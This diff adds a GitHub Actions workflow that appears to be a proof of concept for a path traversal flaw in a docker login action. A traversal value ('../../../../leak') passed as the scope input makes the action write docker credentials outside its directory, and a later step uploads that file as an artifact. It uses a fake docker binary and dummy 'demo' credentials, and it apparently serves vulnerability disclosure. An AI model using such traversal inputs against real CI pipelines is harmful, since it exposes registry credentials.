@@ -1,0 +1,71 @@
+name: poc-scope-traversal
+on:
+  workflow_dispatch:
+    inputs:
+      scope:
+        description: "Traversal payload"
+        required: true
+        default: "../../../../leak"
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install fake docker (safe deterministic test)
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p "$RUNNER_TEMP/bin"
+          cat > "$RUNNER_TEMP/bin/docker" <<'EOF'
+          #!/usr/bin/env bash
+          set -euo pipefail
+          cmd="$1"; shift || true
+          echo "cmd=$cmd DOCKER_CONFIG=${DOCKER_CONFIG:-} args=$*" >> "$RUNNER_TEMP/docker-invocations.log"
+
+          if [ "$cmd" = "login" ]; then
+            cat >/dev/null || true
+            mkdir -p "${DOCKER_CONFIG}"
+            echo '{"auths":{"demo":{"auth":"ZGVtbzpkZW1v"}}}' > "${DOCKER_CONFIG}/config.json"
+            exit 0
+          fi
+
+          if [ "$cmd" = "logout" ]; then
+            exit 0
+          fi
+
+          exit 0
+          EOF
+          chmod +x "$RUNNER_TEMP/bin/docker"
+          echo "$RUNNER_TEMP/bin" >> "$GITHUB_PATH"
+
+      - name: Run vulnerable login action
+        uses: ./
+        with:
+          username: demo
+          password: demo
+          scope: ${{ inputs.scope }}
+          logout: false
+
+      - name: Verify escaped write
+        shell: bash
+        run: |
+          set -euo pipefail
+          echo "RUNNER_TEMP=$RUNNER_TEMP"
+          if [ -f "$RUNNER_TEMP/leak/config.json" ]; then
+            echo "FOUND escaped config at $RUNNER_TEMP/leak/config.json"
+            cat "$RUNNER_TEMP/leak/config.json"
+          else
+            echo "MISSING expected escaped file"
+            exit 1
+          fi
+          echo "---- docker invocation log ----"
+          cat "$RUNNER_TEMP/docker-invocations.log"
+
+      - name: Upload leaked file (exploit chain proof)
+        uses: actions/upload-artifact@v4
+        with:
+          name: leaked-docker-config
+          path: ${{ runner.temp }}/leak/config.json
+          if-no-files-found: error
